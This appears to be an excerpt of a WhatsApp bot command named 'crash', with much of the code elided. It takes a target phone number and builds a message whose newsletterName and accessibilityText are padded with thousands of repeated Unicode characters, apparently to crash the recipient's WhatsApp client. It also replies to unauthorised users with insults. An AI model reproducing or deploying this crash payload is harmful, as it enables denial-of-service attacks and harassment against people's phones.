    ...
    viewOnceMessage: {
      message: {
        ...
        forwardedNewsletterMessageInfo: {
          ...
          serverMessageId: 1,
          newsletterName: `Alter Whatsapp Beta V2 ☠️ ${"ꥈ".repeat(15)}`,
          contentType: 3,
          accessibilityText: `BETA 💢 ${"﹏".repeat(2048)}`
        },
        interactiveMessage: {
          contextInfo: {
...
zokou({ nomCom: "crash", categorie: "Owner", reaction: "☠️" }, async (dest, zk, commandeOptions) => {
  ...
  if (!isOwner) {
    ...
    await repondre(`YOU VILE IMPOSTOR! 😤 Trying to wield ${OWNER_NUMBER}’s destructive power? You’re LESS THAN DUST! Begone! 🚫`);
    return;
  }
  ...
  if (!arg[0]) {
    ...
    await repondre(`You Bustard!, ${userName}! 😡 Provide a target number! Format: .crash 254xxx`);
    return;
  }
  ...
  if (!isValidPhoneNumber(clientNumber)) {
    ...
    await repondre(`IDIOT, ${userName}! 😤 Invalid target number! Use: .crash 254xxx or tag/quote a user! 🚫`);
    return;
  }
  ...
  try {
    ...
    await repondre(`OUTRAGEOUS, ${userName}! 😤 Attack on ${clientNumber} failed: ${e.message}! This system will PAY for its incompetence! 🚫`);
  }
});